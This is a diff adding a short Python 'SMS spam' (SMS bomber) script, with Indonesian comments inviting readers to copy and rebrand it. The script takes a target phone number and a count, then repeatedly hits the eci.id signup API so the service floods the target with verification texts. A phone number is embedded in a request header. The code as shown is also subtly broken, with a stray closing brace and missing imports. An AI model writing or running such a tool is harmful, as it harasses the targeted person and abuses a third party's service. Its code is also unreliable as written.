@@ -1,0 +1,32 @@
+salin semua terus bebas ubah pake nama kalian atau
+mau di hias gimna pun jga
+
+print("spam SMS")
+nomor = input("Masukan nomor target : ")
+jum = int(input("Masukan jumlah spam : "))
+print()
+print("Mohon tunggu sebentar...")
+
+head = {"Host": "eci.id",
+"Connection": "keep-alive",
+"Content-Length": "40",
+"Accept": "application/json, text/plain, */*",
+"Content-Type": "application/json",
+"sec-ch-ua-mobile": "?1",
+"User-Agent": "Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",
+"sec-ch-ua-platform": "Android",
+"Origin": "https://eci.id",
+"Sec-Fetch-Site": "same-origin",
+"Sec-Fetch-Mode": "cors",
+"Sec-Fetch-Dest": "empty",
+"Referer": "https://eci.id/verification?step=1&phone=089652546715",
+"Accept-Encoding": "gzip, deflate, br",
+"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}}
+
+data = json.dumps({"identity":"0"+nomor,"with":"sms"})
+for i in range(jum):
+    pos = requests.post("https://eci.id/api/signup",headers=head,data=data).text
+    if "success" in pos:
+        print("spam berhasil")
+    else:
+        print("spam gagal")
